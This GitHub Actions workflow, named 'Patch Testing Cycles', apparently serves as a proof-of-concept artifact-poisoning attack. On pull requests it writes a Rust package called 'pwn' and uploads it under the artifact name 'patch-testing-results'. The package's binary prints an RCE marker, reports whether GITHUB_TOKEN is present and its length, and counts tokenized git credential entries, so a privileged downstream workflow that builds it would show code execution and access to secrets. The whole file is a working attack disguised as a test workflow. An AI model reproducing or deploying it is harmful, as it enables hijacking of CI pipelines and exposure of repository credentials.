name: Patch Testing Cycles

on:
  pull_request:
    branches: [main, dev, multilinear_v6]
    types: [opened, synchronize]

jobs:
  patch-testing-cycles:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: write
    steps:
      - name: "Checkout sources"
        uses: "actions/checkout@v6"

      - name: Craft artifact payload
        run: |
          mkdir -p payload/src
          cat > payload/Cargo.toml <<'TOML'
          [workspace]
          [package]
          name = "pwn"
          version = "0.1.0"
          edition = "2021"

          [[bin]]
          name = "post-to-github"
          path = "src/main.rs"
          TOML
          cat > payload/src/main.rs <<'RS'
          fn main() {
              println!("RCE_MARKER=artifact_code_executed");
              println!(
                  "CARGO_MANIFEST_DIR={}",
                  std::env::var("CARGO_MANIFEST_DIR").unwrap_or_default()
              );
              match std::env::var("GITHUB_TOKEN") {
                  Ok(token) => println!("GITHUB_TOKEN_present=true len={}", token.len()),
                  Err(_) => println!("GITHUB_TOKEN_present=false"),
              }
              println!("PR_NUMBER={}", std::env::var("PR_NUMBER").unwrap_or_default());
              println!(
                  "GITHUB_REPOSITORY={}",
                  std::env::var("GITHUB_REPOSITORY").unwrap_or_default()
              );
              println!(
                  "OLD_CYCLE_STATS={}",
                  std::env::var("OLD_CYCLE_STATS").unwrap_or_default()
              );
              println!(
                  "NEW_CYCLE_STATS={}",
                  std::env::var("NEW_CYCLE_STATS").unwrap_or_default()
              );
              let cfg = std::process::Command::new("git")
                  .args(["config", "--global", "--get-regexp", "url\\..*\\.insteadof"])
                  .output();
              match cfg {
                  Ok(out) => {
                      let text = String::from_utf8_lossy(&out.stdout).to_string();
                      let n = text.lines().filter(|l| l.contains("@github.com")).count();
                      println!("gitconfig_tokenized_insteadof_entries={}", n);
                  }
                  Err(_) => println!("gitconfig_read_failed"),
              }
          }
          RS

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: patch-testing-results
          path: |
            payload/Cargo.toml
            payload/src/main.rs
          retention-days: 1
